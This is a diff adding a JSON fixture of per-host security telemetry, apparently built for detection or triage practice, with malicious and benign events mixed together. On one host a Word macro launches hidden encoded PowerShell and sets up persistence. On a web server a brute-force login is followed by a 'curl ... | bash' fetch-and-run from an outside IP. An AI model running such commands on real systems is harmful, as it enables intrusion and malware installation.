@@ -1,0 +1,27 @@
+{
+  "WS-FIN-021": [
+    {"ts": "2026-10-20T02:14:05Z", "event": "process_start", "image": "WINWORD.EXE", "cmdline": "WINWORD.EXE /n Invoice_8812.docm"},
+    {"ts": "2026-10-20T02:14:09Z", "event": "process_start", "parent": "WINWORD.EXE", "image": "powershell.exe", "cmdline": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..."},
+    {"ts": "2026-10-20T02:14:11Z", "event": "dns_query", "query": "cdn-update-sync.top"},
+    {"ts": "2026-10-20T02:14:12Z", "event": "network_connect", "dst_ip": "45.155.205.233", "dst_port": 443},
+    {"ts": "2026-10-20T02:14:20Z", "event": "file_create", "path": "C:\\Users\\jlim\\AppData\\Roaming\\svc\\update.exe", "sha256": "5f2b7a1c9d0e4b8a6c3f1e2d7a9b0c4e8f6a2d1b3c5e7f9a0b2c4d6e8f0a1b3c"},
+    {"ts": "2026-10-20T02:14:25Z", "event": "registry_set", "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svcupdate"}
+  ],
+  "WS-ENG-104": [
+    {"ts": "2026-10-21T09:01:00Z", "event": "process_start", "image": "svchost.exe", "cmdline": "svchost.exe -k netsvcs -p -s wuauserv"},
+    {"ts": "2026-10-21T09:01:03Z", "event": "dns_query", "query": "windowsupdate.com"},
+    {"ts": "2026-10-21T09:05:40Z", "event": "process_start", "image": "git.exe", "cmdline": "git clone https://github.com/org/internal-tools"}
+  ],
+  "SRV-WEB-01": [
+    {"ts": "2026-10-22T13:00:01Z", "event": "auth_failure", "user": "root", "src_ip": "185.220.101.45", "count": 412},
+    {"ts": "2026-10-22T13:04:10Z", "event": "auth_success", "user": "deploy", "src_ip": "185.220.101.45"},
+    {"ts": "2026-10-22T13:04:30Z", "event": "process_start", "image": "/bin/bash", "cmdline": "curl -s http://45.155.205.233/x.sh | bash"}
+  ],
+  "SRV-SCAN-01": [
+    {"ts": "2026-10-22T01:00:00Z", "event": "process_start", "image": "/usr/bin/nmap", "cmdline": "nmap -sV -p- 10.20.0.0/24"}
+  ],
+  "VPN-GW-01": [
+    {"ts": "2026-10-23T07:10:00Z", "event": "vpn_login", "user": "mtan", "src_country": "SG", "device": "managed-laptop-778"},
+    {"ts": "2026-10-23T07:40:00Z", "event": "vpn_login", "user": "mtan", "src_country": "JP", "device": "managed-laptop-778", "note": "corporate VPN egress Tokyo"}
+  ]
+}
